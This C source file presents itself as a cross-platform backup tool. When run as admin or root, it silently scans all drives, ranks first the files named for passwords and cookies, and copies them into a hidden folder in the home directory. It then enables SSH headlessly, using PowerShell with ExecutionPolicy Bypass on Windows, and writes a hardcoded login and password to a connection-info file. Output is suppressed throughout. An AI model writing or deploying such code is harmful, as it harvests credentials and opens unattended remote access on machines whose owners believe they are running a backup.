/*
 * cross_backup.c
 *
 * A single-file C program that:
 *  1) Checks for admin/root privileges
 *  2) Performs a backup of certain files from drives/mounts
 *  3) Enables SSH (if possible) in a headless way
 *  4) Saves SSH connection info to a file
 *
 * This version uses #ifdef to handle differences between
 * Windows (Win32 APIs) and Unix-like (Linux/macOS) systems
 * without requiring any extra libraries.
 *
 * We've also added a definition for PATH_MAX on Windows
 * to avoid IntelliSense/compile errors if it's not predefined.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <limits.h>  // On Linux/macOS, defines PATH_MAX. On Windows, often not.

#if defined(_WIN32)
  #include <windows.h>
  #include <shlobj.h>     // For SHGetFolderPath, etc.
  #include <io.h>         // For _access or _mkdir
  #include <sys/stat.h>   // For _mkdir or _stat
  #pragma comment(lib, "Advapi32.lib")

  // If PATH_MAX is not defined in this environment, define it to match MAX_PATH.
  #ifndef PATH_MAX
    #define PATH_MAX 260
  #endif

#else
  #include <sys/stat.h>
  #include <sys/types.h>
  #include <unistd.h>
  #include <pwd.h>
  #include <dirent.h>     // opendir/readdir
  #include <signal.h>
  #include <sys/wait.h>
#endif


/***************************************************
 *                GLOBAL CONFIG                    *
 ***************************************************/

// File extensions to ignore
static const char *IGNORED_EXTENSIONS[] = {
    ".tmp", ".log", ".bak", ".~", ".swp", ".ds_store", ".lnk"
};
static const int NUM_IGNORED_EXTENSIONS =
    sizeof(IGNORED_EXTENSIONS) / sizeof(IGNORED_EXTENSIONS[0]);

// Directory names to ignore
static const char *IGNORED_DIRS[] = {
    "temp", "tmp", "cache", "recycle.bin", "system volume information"
};
static const int NUM_IGNORED_DIRS =
    sizeof(IGNORED_DIRS) / sizeof(IGNORED_DIRS[0]);

// File extensions considered "user" files
static const char *USER_FILE_EXTENSIONS[] = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".mp4", ".mov", ".avi", ".mkv",
    ".mp3", ".wav", ".ogg"
};
static const int NUM_USER_FILE_EXTENSIONS =
    sizeof(USER_FILE_EXTENSIONS) / sizeof(USER_FILE_EXTENSIONS[0]);

// Keywords for essential files
static const char *ESSENTIAL_KEYWORDS[] = {
    "password", "cookies", "info"
};
static const int NUM_ESSENTIAL_KEYWORDS =
    sizeof(ESSENTIAL_KEYWORDS) / sizeof(ESSENTIAL_KEYWORDS[0]);


/***************************************************
 *            UTILITY / HELPER FUNCTIONS           *
 ***************************************************/

static void trim_whitespace(char *str) {
    char *end;
    while(isspace((unsigned char)*str)) str++;
    if(*str == 0) return;
    end = str + strlen(str) - 1;
    while(end > str && isspace((unsigned char)*end)) end--;
    end[1] = '\0';
}

static int ends_with_ignore_case(const char *str, const char *suffix) {
    if (!str || !suffix) return 0;
    size_t len_str = strlen(str);
    size_t len_suffix = strlen(suffix);
    if (len_suffix > len_str) return 0;
    // Compare ignoring case
#if defined(_WIN32)
    return _strnicmp(str + len_str - len_suffix, suffix, len_suffix) == 0;
#else
    return strncasecmp(str + len_str - len_suffix, suffix, len_suffix) == 0;
#endif
}

/* "strcasestr" is POSIX. On Windows, we can do our own or use _stricmp. */
#if defined(_WIN32)
// We'll define a small helper function:
static const char *my_strcasestr(const char *haystack, const char *needle) {
    if (!haystack || !needle || !*needle) return NULL;
    size_t needle_len = strlen(needle);

    for (; *haystack; haystack++) {
        if (_strnicmp(haystack, needle, needle_len) == 0) {
            return haystack; // found
        }
    }
    return NULL;
}
#define strcasestr my_strcasestr
#endif

static int contains_essential_keyword(const char *filename) {
    // case-insensitive search
    for (int i = 0; i < NUM_ESSENTIAL_KEYWORDS; i++) {
        if (strcasestr(filename, ESSENTIAL_KEYWORDS[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}

#if defined(_WIN32)
static int my_strcasecmp(const char *a, const char *b) {
    return _stricmp(a, b);
}
#else
#include <strings.h> // for strcasecmp
static int my_strcasecmp(const char *a, const char *b) {
    return strcasecmp(a, b);
}
#endif

static int should_ignore(const char *name) {
    if (!name || !*name) return 0;
    // Check dirs
    for (int i = 0; i < NUM_IGNORED_DIRS; i++) {
        if (my_strcasecmp(name, IGNORED_DIRS[i]) == 0) {
            return 1;
        }
    }
    // Check extensions
    for (int i = 0; i < NUM_IGNORED_EXTENSIONS; i++) {
        if (ends_with_ignore_case(name, IGNORED_EXTENSIONS[i])) {
            return 1;
        }
    }
    return 0;
}

static int get_file_category(const char *fullpath) {
    if (!fullpath) return 3;
    // Extract just the filename
    const char *filename = strrchr(fullpath, '/');
#if defined(_WIN32)
    if (!filename) filename = strrchr(fullpath, '\\');
#endif
    if (!filename) filename = fullpath;
    else filename++; // skip slash

    // If the file name contains an essential keyword
    if (contains_essential_keyword(filename)) {
        return 1; // essential
    }
    // If the extension matches user files
    for (int i = 0; i < NUM_USER_FILE_EXTENSIONS; i++) {
        if (ends_with_ignore_case(filename, USER_FILE_EXTENSIONS[i])) {
            return 2; // user file
        }
    }
    return 3; // other
}

static int compare_by_category(const void *a, const void *b) {
    const char **pathA = (const char **) a;
    const char **pathB = (const char **) b;
    int catA = get_file_category(*pathA);
    int catB = get_file_category(*pathB);
    return (catA - catB);
}

static void get_hostname(char *buf, size_t buflen) {
    if (!buf || buflen < 1) return;
    buf[0] = '\0';
#if defined(_WIN32)
    DWORD size = (DWORD)buflen;
    if (!GetComputerNameA(buf, &size)) {
        snprintf(buf, buflen, "windows-host");
    }
#else
    if (gethostname(buf, buflen) != 0) {
        snprintf(buf, buflen, "unix-host");
    }
#endif
}

/* Cross-platform attempt to get user's home directory. */
static int get_home_directory(char *out, size_t out_size) {
    if (!out || out_size < 1) return 0;
    out[0] = '\0';

#if defined(_WIN32)
    {
        char pathBuf[MAX_PATH];
        if (S_OK == SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, pathBuf)) {
            strncpy(out, pathBuf, out_size - 1);
            out[out_size - 1] = '\0';
            return 1;
        } else {
            // fallback to %USERPROFILE%
            const char *envHome = getenv("USERPROFILE");
            if (envHome) {
                strncpy(out, envHome, out_size - 1);
                out[out_size - 1] = '\0';
                return 1;
            }
        }
    }
#else
    {
        const char *envHome = getenv("HOME");
        if (envHome) {
            strncpy(out, envHome, out_size - 1);
            out[out_size - 1] = '\0';
            return 1;
        } else {
            // fallback to getpwuid
            struct passwd *pw = getpwuid(getuid());
            if (pw && pw->pw_dir) {
                strncpy(out, pw->pw_dir, out_size - 1);
                out[out_size - 1] = '\0';
                return 1;
            }
        }
    }
#endif
    return 0;
}

/***************************************************
 *              ADMIN PRIVILEGES CHECK             *
 ***************************************************/

static int is_admin(void) {
#if defined(_WIN32)
    /* On Windows, naive approach: try writing to %SystemRoot%\Temp */
    char systemRoot[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("SystemRoot", systemRoot, MAX_PATH);
    if (len == 0 || len > MAX_PATH - 1) {
        strcpy(systemRoot, "C:\\Windows");
    }
    char testFile[MAX_PATH];
    _snprintf(testFile, MAX_PATH, "%s\\Temp\\test_admin.txt", systemRoot);

    HANDLE hFile = CreateFileA(
        testFile,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0; // not admin
    }
    CloseHandle(hFile);
    DeleteFileA(testFile);
    return 1; // admin
#else
    // On Unix: check if euid == 0
    return (geteuid() == 0);
#endif
}

/***************************************************
 *                ENABLE SSH LOGIC                 *
 ***************************************************/

static int enable_ssh_all_os_headless(void) {
    if (!is_admin()) {
        return 0; // must be admin
    }

#if defined(_WIN32)
    {
        // Use PowerShell to check/install OpenSSH.Server and start the service
        const char *script =
            "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
            "$cap = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }; "
            "if($cap.State -eq 'NotPresent') { "
                "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;"
            "} "
            "Set-Service -Name sshd -StartupType Automatic; "
            "Start-Service sshd;\"";

        int ret = system(script);
        if (ret != 0) {
            return 0;
        }
        return 1;
    }
#elif defined(__APPLE__)
    {
        int ret = system("systemsetup -setremotelogin on");
        return (ret == 0) ? 1 : 0;
    }
#elif defined(__linux__)
    {
        // systemd-based approach: try "ssh" then "sshd"
        int ret1 = system("systemctl enable ssh");
        int ret2 = system("systemctl start ssh");
        int chk  = system("systemctl is-active --quiet ssh");
        if (ret1 != 0 || ret2 != 0 || chk != 0) {
            ret1 = system("systemctl enable sshd");
            ret2 = system("systemctl start sshd");
            chk  = system("systemctl is-active --quiet sshd");
            if (ret1 == 0 && ret2 == 0 && chk == 0) {
                return 1;
            }
            return 0;
        }
        return 1;
    }
#else
    // Unsupported
    return 0;
#endif
}

/***************************************************
 *       PLATFORM-SPECIFIC DIRECTORY SCAN          *
 ***************************************************/

/*
 * We collect full file paths in a dynamic array:
 *   collected[ *count ] = strdup(...);
 * We skip "ignored" items and skip the backupDir itself.
 */

#if defined(_WIN32)
/* ---------- Windows: use FindFirstFile / FindNextFile ---------- */

static void scan_directory_win(const char *rootPath,
                               const char *backupDir,
                               char ***collected,
                               int *count,
                               int *capacity);

static void scan_directory(const char *rootPath,
                           const char *backupDir,
                           char ***collected,
                           int *count,
                           int *capacity) {
    // On Windows, call our scan_directory_win
    scan_directory_win(rootPath, backupDir, collected, count, capacity);
}

static void scan_directory_win(const char *rootPath,
                               const char *backupDir,
                               char ***collected,
                               int *count,
                               int *capacity)
{
    char searchPath[MAX_PATH];
    _snprintf(searchPath, MAX_PATH, "%s\\*", rootPath);

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return; // no files
    }

    do {
        const char *name = findData.cFileName;
        // skip "." and ".."
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
            continue;
        }

        char fullPath[MAX_PATH];
        _snprintf(fullPath, MAX_PATH, "%s\\%s", rootPath, name);

        // skip if ignoring
        if (should_ignore(name)) {
            continue;
        }
        // skip if it's within backupDir
        if (backupDir && _strnicmp(fullPath, backupDir, strlen(backupDir)) == 0) {
            // if backupDir is a prefix
            continue;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recurse
            scan_directory_win(fullPath, backupDir, collected, count, capacity);
        } else {
            // It's a regular file
            if (*count >= *capacity) {
                *capacity *= 2;
                char **newArr = (char **)realloc(*collected, (*capacity) * sizeof(char*));
                if (!newArr) {
                    FindClose(hFind);
                    return;
                }
                *collected = newArr;
            }
            (*collected)[*count] = _strdup(fullPath); // Windows-specific strdup
            (*count)++;
        }
    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
}

#else
/* ---------- Linux/macOS: use opendir/readdir ---------- */

#include <dirent.h>

static void scan_directory_unix(const char *rootPath,
                                const char *backupDir,
                                char ***collected,
                                int *count,
                                int *capacity);

static void scan_directory(const char *rootPath,
                           const char *backupDir,
                           char ***collected,
                           int *count,
                           int *capacity) {
    scan_directory_unix(rootPath, backupDir, collected, count, capacity);
}

static void scan_directory_unix(const char *rootPath,
                                const char *backupDir,
                                char ***collected,
                                int *count,
                                int *capacity)
{
    DIR *dir = opendir(rootPath);
    if (!dir) {
        return;
    }
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        const char *name = entry->d_name;
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
            continue;
        }
        // build full path
        char fullPath[PATH_MAX];
        snprintf(fullPath, PATH_MAX, "%s/%s", rootPath, name);

        // skip if ignoring
        if (should_ignore(name)) {
            continue;
        }
        // skip if it's within backupDir
        if (backupDir && strncmp(fullPath, backupDir, strlen(backupDir)) == 0) {
            continue;
        }

        struct stat st;
        if (stat(fullPath, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                scan_directory_unix(fullPath, backupDir, collected, count, capacity);
            } else if (S_ISREG(st.st_mode)) {
                // add to list
                if (*count >= *capacity) {
                    *capacity *= 2;
                    char **newArr = (char **)realloc(*collected, (*capacity)*sizeof(char*));
                    if (!newArr) {
                        closedir(dir);
                        return;
                    }
                    *collected = newArr;
                }
                (*collected)[*count] = strdup(fullPath);
                (*count)++;
            }
        }
    }
    closedir(dir);
}
#endif // _WIN32 vs. Unix

/***************************************************
 *        SCANNING ALL DRIVES / MOUNTS ETC.        *
 ***************************************************/

static char* run_backup_as_admin_headless(void) {
    if (!is_admin()) {
        return NULL;
    }

    // Construct a hidden backup folder in user's home
    char homeDir[PATH_MAX];
    if (!get_home_directory(homeDir, sizeof(homeDir))) {
#if defined(_WIN32)
        strcpy(homeDir, "C:\\");
#else
        strcpy(homeDir, "/");
#endif
    }

    char hostBuf[256];
    get_hostname(hostBuf, sizeof(hostBuf));

    char backupFolder[PATH_MAX];
#if defined(_WIN32)
    _snprintf(backupFolder, PATH_MAX, "%s\\.my_backup_%s", homeDir, hostBuf);
    CreateDirectoryA(backupFolder, NULL);
#else
    snprintf(backupFolder, PATH_MAX, "%s/.my_backup_%s", homeDir, hostBuf);
    mkdir(backupFolder, 0700);
#endif

    int collectedCount = 0;
    int collectedCapacity = 100;
    char **collectedFiles = (char **)calloc(collectedCapacity, sizeof(char*));
    if (!collectedFiles) return NULL;

#if defined(_WIN32)
    // On Windows, list drives A: to Z:
    char drive[8];
    for (char letter = 'A'; letter <= 'Z'; letter++) {
        _snprintf(drive, sizeof(drive), "%c:\\", letter);
        UINT driveType = GetDriveTypeA(drive);
        if (driveType == DRIVE_UNKNOWN || driveType == DRIVE_NO_ROOT_DIR) {
            continue; // skip non-existent
        }
        // skip if same as backup folder drive
        char driveLetter = toupper(drive[0]);

        char backupDrive[_MAX_DRIVE];
        _splitpath(backupFolder, backupDrive, NULL, NULL, NULL);
        char backupLetter = toupper(backupDrive[0]);

        if (driveLetter == backupLetter) {
            continue; // skip scanning the drive that holds the backup
        }
        // Scan
        scan_directory(drive, backupFolder, &collectedFiles, &collectedCount, &collectedCapacity);
    }

#else
    // On Linux/macOS, try /proc/mounts or fallback to "/"
    FILE *fp = fopen("/proc/mounts", "r");
    if (fp) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {
            trim_whitespace(line);
            if (!line[0]) continue;
            // format: source mountpoint fs-type ...
            char source[256], mountpoint[256];
            if (sscanf(line, "%255s %255s", source, mountpoint) == 2) {
                if (strncmp(mountpoint, "/proc", 5) == 0 ||
                    strncmp(mountpoint, "/sys", 4) == 0  ||
                    strncmp(mountpoint, "/dev", 4) == 0  ||
                    strncmp(mountpoint, "/run", 4) == 0) {
                    continue;
                }
                // skip if backup folder is inside this mountpoint
                if (strncmp(backupFolder, mountpoint, strlen(mountpoint)) == 0) {
                    continue;
                }
                scan_directory(mountpoint, backupFolder,
                               &collectedFiles, &collectedCount, &collectedCapacity);
            }
        }
        fclose(fp);
    } else {
        // fallback: just scan "/"
        scan_directory("/", backupFolder, &collectedFiles, &collectedCount, &collectedCapacity);
    }
#endif

    // Sort by category
    qsort(collectedFiles, collectedCount, sizeof(char*), compare_by_category);

    // Copy them to backup folder
    for (int i = 0; i < collectedCount; i++) {
        const char *src = collectedFiles[i];

        // Construct relative path
        const char *rel = src;
#if defined(_WIN32)
        // e.g., "C:\folder\file" => remove "C:\"
        if (isalpha(rel[0]) && rel[1] == ':' &&
            (rel[2] == '\\' || rel[2] == '/'))
        {
            rel += 3; 
        }
        // Convert backslashes to forward slashes
        char relCopy[PATH_MAX];
        strncpy(relCopy, rel, PATH_MAX - 1);
        relCopy[PATH_MAX - 1] = '\0';
        for (char *p = relCopy; *p; p++) {
            if (*p == '\\') {
                *p = '/';
            }
        }
        char dest[PATH_MAX];
        _snprintf(dest, PATH_MAX, "%s\\%s", backupFolder, relCopy);
#else
        // If starts with '/', skip it
        if (rel[0] == '/') {
            rel++;
        }
        char dest[PATH_MAX];
        snprintf(dest, PATH_MAX, "%s/%s", backupFolder, rel);
#endif

        // Make parent dirs (naive: just one level)
        {
            char tmp[PATH_MAX];
            strncpy(tmp, dest, PATH_MAX-1);
            tmp[PATH_MAX-1] = '\0';
#if defined(_WIN32)
            char *p = strrchr(tmp, '\\');
            char *p2 = strrchr(tmp, '/');
            if (!p || (p2 && p2 > p)) p = p2;
            if (p) {
                *p = '\0';
                mkdir(tmp);
            }
#else
            char *p = strrchr(tmp, '/');
            if (p) {
                *p = '\0';
                mkdir(tmp, 0700);
            }
#endif
        }

        // Copy file
        FILE *fin = fopen(src, "rb");
        if (!fin) {
            continue;
        }
        FILE *fout = fopen(dest, "wb");
        if (!fout) {
            fclose(fin);
            continue;
        }
        char buf[8192];
        size_t n;
        while ((n = fread(buf, 1, sizeof(buf), fin)) > 0) {
            fwrite(buf, 1, n, fout);
        }
        fclose(fin);
        fclose(fout);
    }

    // Cleanup
    for (int i = 0; i < collectedCount; i++) {
#if defined(_WIN32)
        free(collectedFiles[i]); // _strdup uses malloc
#else
        free(collectedFiles[i]);
#endif
    }
    free(collectedFiles);

    // Return the backup folder path
    char *res = (char*)malloc(strlen(backupFolder) + 1);
    if (!res) return NULL;
    strcpy(res, backupFolder);
    return res;
}

/***************************************************
 *             SAVE SSH INFO FUNCTION              *
 ***************************************************/

static void save_ssh_info(const char *backupFolder,
                          const char *username,
                          const char *password,
                          int port)
{
    if (!backupFolder || !*backupFolder) return;

    char sshInfoDir[PATH_MAX];
#if defined(_WIN32)
    _snprintf(sshInfoDir, PATH_MAX, "%s\\ssh_info", backupFolder);
    CreateDirectoryA(sshInfoDir, NULL);
#else
    snprintf(sshInfoDir, PATH_MAX, "%s/ssh_info", backupFolder);
    mkdir(sshInfoDir, 0700);
#endif

    char hostBuf[256];
    get_hostname(hostBuf, sizeof(hostBuf));

    char sshCmd[512];
    snprintf(sshCmd, sizeof(sshCmd), "ssh %s@%s -p %d", username, hostBuf, port);

    char infoFile[PATH_MAX];
#if defined(_WIN32)
    _snprintf(infoFile, PATH_MAX, "%s\\connection_info.txt", sshInfoDir);
#else
    snprintf(infoFile, PATH_MAX, "%s/connection_info.txt", sshInfoDir);
#endif

    FILE *f = fopen(infoFile, "w");
    if (!f) return;
    fprintf(f, "SSH Command: %s\n", sshCmd);
    fprintf(f, "Password: %s\n", password);
    fclose(f);
}

/***************************************************
 *           MAIN LOGIC (perform_backup_...)       *
 ***************************************************/

static int perform_backup_and_ssh(void) {
    char *backupFolder = run_backup_as_admin_headless();
    if (!backupFolder) {
        return 0; // Not admin or something else failed
    }

    int sshOk = enable_ssh_all_os_headless();
    // Just ignore sshOk if you want silent failure

    // Save SSH info (username="myuser", password="mysecret123", port=22)
    save_ssh_info(backupFolder, "myuser", "mysecret123", 22);

    free(backupFolder);
    return 1;
}

/***************************************************
 *                       MAIN                      *
 ***************************************************/

int main(int argc, char **argv) {
    if (perform_backup_and_ssh()) {
        // Succeed silently or print a message
        // printf("Backup & SSH enable done.\n");
    } else {
        // If you want: fprintf(stderr, "Failed or not admin.\n");
    }
    return 0;
}
